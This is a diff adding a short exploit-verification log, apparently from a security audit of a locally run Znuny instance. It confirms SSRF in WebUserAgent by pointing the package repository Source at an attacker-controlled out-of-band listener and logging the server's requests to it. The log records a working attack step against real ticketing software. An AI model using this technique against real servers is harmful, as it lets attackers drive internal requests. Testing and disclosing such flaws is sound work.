@@ -1,0 +1,10 @@
+==========================================================================
+VULN-028: SSRF via unguarded WebUserAgent (package repository Source)
+Target: http://localhost:25114
+[INFO] WebUserAgent.pm:225 get($Param{URL}) — no internal-IP/scheme/host allowlist
+==========================================================================
+[SETUP] OOB listener at http://172.18.0.1:39863; setting package repository Source=http://172.18.0.1:39863/repo
+[STEP] GET AdminPackageManager with the attacker Source -> server fetches Source/otrs.xml
+[PROOF] OOB listener received 2 request(s): [('GET', '/repo/otrs.xml', '172.18.0.3'), ('GET', '/repo/otrs.xml', '172.18.0.3')]
+[OK] exploit confirmed — the Znuny server fetched the attacker-controlled URL http://172.18.0.1:39863/repo/... : the OOB listener logged 2 inbound request(s) from the app container (['172.18.0.3']) — WebUserAgent performs no SSRF filtering, so an admin-set URL drives server-side requests to arbitrary hosts.
+==> VULN-028: CONFIRMED — the Znuny server fetched the attacker-controlled URL http://172.18.0.1:39863/repo/... : the OOB listener logged 2 inbound request(s) from the app container (['172.18.0.3']) — WebUserAgent performs no SSRF filtering, so an admin-set URL drives server-side requests to arbitrary hosts.
